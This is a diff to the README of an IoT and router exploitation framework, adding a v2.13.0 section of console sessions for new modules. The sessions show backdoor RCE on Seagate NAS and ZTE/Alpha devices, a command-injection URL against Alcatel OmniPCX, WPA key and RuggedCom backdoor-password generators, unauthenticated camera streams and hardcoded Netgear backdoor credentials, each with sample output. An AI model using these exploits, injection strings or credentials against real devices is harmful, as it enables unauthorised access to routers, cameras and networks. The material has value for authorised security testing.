@@ -2,16 +2,16 @@
 
 **Embedded & Perimeter Security Assessment Framework**
 
-EmbedXPL-Forge is an open-source exploitation framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, and IoT/embedded edge devices. It provides **3200+ modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, and multi-language PolyExploit orchestration — with **680+ CVEs** mapped across **95+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
+EmbedXPL-Forge is an open-source exploitation framework for security professionals auditing routers, switches, IP cameras, NVR/DVR, GPON ONTs, ISP CPEs, and IoT/embedded edge devices. It provides **3200+ modules** covering credential testing, vulnerability exploitation, network scanning, payload generation, RTSP camera attacks, firmware manipulation, and multi-language PolyExploit orchestration — with **680+ CVEs** mapped across **114+ vendors** and an **APT Group Attack Engine** that reproduces real-world nation-state attack chains.
 
 > **Author:** André Henrique ([@mrhenrike](https://github.com/mrhenrike)) | [União Geek](https://github.com/Uniao-Geek)
-> **Version:** 2.12.0
+> **Version:** 2.13.0
 
 ---
 
 ## Features
 
-- **540+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt
+- **570+ exploit modules** — RCE, auth bypass, path traversal, info disclosure, buffer overflow, DNS hijacking, command injection, backdoor, CSRF, config decrypt, WPA/WPS keygen, factory password generators
 - **88 credential modules** — dictionary attacks against FTP, SSH, Telnet, HTTP, SNMP, SFTP
 - **Full RTSP camera engine** — ported from [cameradar](https://github.com/ullaakut/cameradar): route brute-force (195+ routes), credential brute-force (80+ pairs), Basic/Digest auth, RTSPS/TLS, **RTSP-over-HTTP tunnel (pure Python, RFC 2326 App-C)**, nmap/masscan/direct scanner, ONVIF WS-Discovery, M3U output
 - **7 custom Nmap NSE scripts** — RTSP discovery, camera fingerprinting, Hikvision/Dahua CVE validation, default credential testing, multi-vendor CVE checks, snapshot capture (`pip install embedxpl[nse]`)
@@ -41,7 +41,7 @@ EmbedXPL-Forge is an open-source exploitation framework for security professiona
 
 ## Supported Vendors
 
-**Network equipment:** 2Wire · 3Com · ActionTec · Arris · Aruba · Asmax · ASUS · Belkin · BHU · Billion · Calix · CERIO · Cisco · Comtrend · D-Link · Draytek · FiberHome · Fortinet · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MikroTik · MitraStar · Movistar · Netcore · NETGEAR · Netsys · OpenWrt · Ruijie · SerComm · Shuttle · SonicWall · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubiquiti · Wavlink · Xiaomi · Zhone · ZTE · ZyXEL
+**Network equipment:** 2Wire · 3Com · ActionTec · Alcatel-Lucent · Alpha Networks · Arris · Aruba · Asmax · Astoria · ASUS · Belkin · BHU · Billion · Binatone · Calix · CERIO · Cisco · Cobham · Comtrend · D-Link · DD-WRT · Draytek · EasyBox (Arcadyan) · Edimax · EE BrightBox · FiberHome · Fortinet · Freebox · GL.iNet · GPON · HooToo · Huawei · Intelbras · IPFire · Juniper · LG · Linksys · Mercury · MiFi (Novatel) · MikroTik · MitraStar · Motorola · Movistar · Netcore · NETGEAR · Netsys · Observa Telecom · OpenWrt · RuggedCom · Ruijie · Seagate · SerComm · Shuttle · Sitecom · SMC · SonicWall · Starbridge · Technicolor · Tenda · Thomson · TOTOLINK · TP-Link · TRENDnet · Ubee · Ubiquiti · Unicorn · UTStarcom · Wavlink · Xiaomi · Zhone · Zoom · ZTE · ZyXEL
 
 **Cameras / NVR / DVR:** Hikvision · Dahua · Axis · Reolink · Amcrest · Uniview (UNV) · Tapo (TP-Link) · Swann · ANNKE · Edimax · Intelbras · Grandstream · Foscam · Acti · Avigilon · Beward · Brickcom · Cisco cameras · Geuterbruck · Honeywell cameras · Jovision · Siemens cameras · Xiongmai (OEM) · Zivif · MVPower DVR · Generic P2P WiFi cameras · Generic DVR/NVR OEM
 
@@ -668,6 +668,77 @@ for r in results:
 
 ---
 
+## New in v2.13.0 — routerpwn.com Gap Coverage
+
+27 new exploit modules from a complete audit of [routerpwn.com](https://github.com/hkm/routerpwn.com) and [routerPWN](https://github.com/lilloX/routerPWN). Key examples:
+
+```
+# EasyBox (Arcadyan) — WPA2 default key from MAC (factory algorithm)
+exf > use exploits/routers/easybox/easybox_wpa_keygen
+exf (EasyBox WPA Keygen) > set target 192.168.1.1
+exf (EasyBox WPA Keygen) > run
+[*] No MAC supplied — attempting to extract from web UI...
+[+] MAC found: AA:BB:CC:DD:EE:FF
+[+] Device MAC  : AA:BB:CC:DD:EE:FF
+[+] WPA2 PSK    : 3f2d9a1b
+
+# Seagate NAS — Ghost PHP unauthenticated RCE (CVE-2014-8684)
+exf > use exploits/routers/seagate/seagate_nas_php_backdoor
+exf (Seagate Ghost PHP) > set target 192.168.1.100
+exf (Seagate Ghost PHP) > set cmd "id; uname -a"
+exf (Seagate Ghost PHP) > run
+[*] Sending command via Ghost PHP backdoor: 'id; uname -a'
+[+] RCE successful — output:
+    uid=0(root) gid=0(root) groups=0(root)
+    Linux NAS 3.10.14 #1 SMP armv7l
+
+# Alpha Networks / ZTE — web_shell_cmd.gch backdoor
+exf > use exploits/routers/alpha_networks/web_shell_cmd_rce
+exf (Alpha Networks web_shell_cmd RCE) > set target 192.168.1.1
+exf (Alpha Networks web_shell_cmd RCE) > set cmd "cat /etc/passwd"
+exf (Alpha Networks web_shell_cmd RCE) > run
+[*] Sending command to /web_shell_cmd.gch: 'cat /etc/passwd'
+[+] Response from backdoor shell:
+    root:x:0:0:root:/root:/bin/sh
+    ...
+
+# RuggedCom — factory backdoor password generator (FD 2012/Apr/277)
+exf > use exploits/routers/ruggedcom/ruggedcom_factory_password
+exf (RuggedCom Factory Password) > set target 192.168.1.1
+exf (RuggedCom Factory Password) > set serial RA000000
+exf (RuggedCom Factory Password) > run
+[+] Serial Number  : RA000000
+[+] Backdoor user  : factory
+[+] Backdoor pass  : 7f3d9a2b
+
+# Alcatel-Lucent OmniPCX Enterprise — masterCGI RCE
+exf > use exploits/routers/alcatel_lucent/omnipcx_masterCGI_rce
+exf (OmniPCX RCE) > set target 192.168.1.10
+exf (OmniPCX RCE) > set cmd "id"
+exf (OmniPCX RCE) > run
+[*] Injecting command: 'id' via /cgi-bin/masterCGI?ping=127.0.0.1&user=;id;
+[+] Response (command output may be embedded): uid=0(root) ...
+
+# TRENDnet camera — unauthenticated MJPEG live stream
+exf > use exploits/routers/trendnet/camera_mjpeg_unauth
+exf (TRENDnet MJPEG) > set target 192.168.1.50
+exf (TRENDnet MJPEG) > run
+[+] LIVE STREAM accessible (no auth): /anony/mjpg.cgi
+[+] Stream URL: http://192.168.1.50:80/anony/mjpg.cgi
+
+# Netgear WG602 — hardcoded backdoor credentials
+exf > use exploits/routers/netgear/wg602_superman_backdoor
+exf (WG602 Backdoor) > set target 192.168.1.1
+exf (WG602 Backdoor) > run
+[+] Backdoor login SUCCESS: super:5777364
+[*] Admin panel: http://192.168.1.1:80/
+```
+
+**All 27 new vendors/modules:**
+`alcatel_lucent` · `alpha_networks` · `astoria` · `binatone` · `ddwrt` · `easybox` · `ee` · `freebox` · `mifi` · `motorola` · `observa` · `ruggedcom` · `seagate` · `sitecom` · `starbridge` · `ubee` · `unicorn` · `utstarcom` · `zoom` · plus belkin, netgear, trendnet gap-fills.
+
+---
+
 ## Module Structure
 
 ```
@@ -698,7 +769,7 @@ embedxpl/
 │   │   │   └── edimax/    # Edimax IC-7100 (CVE-2025-1316, CISA KEV)
 │   │   ├── firmware/      # Firmware flash bypass (NETGEAR, TP-Link, D-Link, ASUS)
 │   │   ├── nas/           # NAS exploits (QNAP, D-Link NAS, Zyxel)
-│   │   ├── routers/       # Router exploits by vendor (44 vendor folders)
+│   │   ├── routers/       # Router exploits by vendor (85 vendor folders — see full list below)
 │   │   ├── vpn/           # VPN/firewall appliances (Ivanti, Fortinet, SonicWall)
 │   │   ├── switches/      # Switch exploits (Cisco, D-Link, NETGEAR)
 │   │   └── soho_edge/     # SOHO edge device exploits
